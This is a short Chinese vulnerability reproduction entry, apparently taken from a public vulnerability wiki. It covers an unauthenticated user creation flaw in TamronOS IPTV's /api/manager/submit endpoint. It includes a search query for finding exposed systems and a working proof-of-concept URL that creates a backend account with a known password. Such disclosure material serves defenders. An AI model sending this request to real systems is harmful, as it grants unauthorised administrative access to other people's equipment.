---
title: "TamronOS IPTV系统 submit 任意用户创建漏洞"
date: 2026-10-16 09:09:24
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "TamronOS-IPTV系统-submit"
tags:
  - "TamronOS-IPTV系统-submit"
  - "漏洞复现"
---
## 漏洞描述

TamronOS IPTV系统 /api/manager/submit 存在任意用户创建漏洞，攻击者通过漏洞可以任意用户创建进入后台

## 漏洞影响

```
TamronOS IPTV系统
```

## 网络测绘

```
app="TamronOS-IPTV系统"
```

## 漏洞复现

登录页面如下



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101926166.png)



## 漏洞POC为



```plain
/api/manager/submit?group=1&username=test&password=123456
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101926524.png)



```plain
user: test
pass: 123456
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101926288.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/TamronOS-IPTV%E7%B3%BB%E7%BB%9F-submit-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E.md)
